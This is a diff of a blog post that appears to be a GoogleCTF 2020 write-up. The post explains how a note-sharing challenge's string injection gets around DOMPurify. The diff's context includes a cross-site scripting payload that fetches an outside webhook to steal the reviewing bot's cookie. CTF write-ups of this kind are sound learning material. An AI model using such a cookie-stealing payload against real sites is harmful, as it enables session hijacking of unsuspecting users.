@@ -12,8 +12,6 @@ tags:
 
 This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!
 
-(As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)
-
 ## Let's Begin!
 
 The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
@@ -23,7 +21,7 @@ When you make a note, you have an option to share it with a "TjMike" Entity. Sig
 _My input, "uwu", is shoved into a javascript string variable called 'note'. Further down we see a_ ``const clean`` _variable that calls DOMpurify to sanitize our input._
 
 
-Looking into the HTML, whatever content we put into the note is immediately shoved into a javascript string. However, if you try to input quotation marks in there, the DOMpurify clean function escapes it. So, if we can get an unescaped quote in there, we can do whatever want. Let's focus on the comment.
+Looking into the HTML, whatever content we put into the note is immediately shoved into a javascript string. However, if you try to input quotation marks in there, the DOMpurify clean function escapes it. So, if we can get an unescaped quote in there, we can do whatever we want. Let's focus on the comment.
 
 {{< image src="/images/google2020source.png" alt="Login" position="center" style="border-radius: 8px;" >}}
 
@@ -63,3 +61,7 @@ content[]=; document.getElementById('note-content').onLoad = fetch('https://webh
 ```
 
 Share our note to TJMike. Wait for our server to grab their cookie. 
+
+{{< image src="/images/googlectf2020pastflag.png" alt="Login" position="center" style="border-radius: 8px;" >}}
+
+Jam
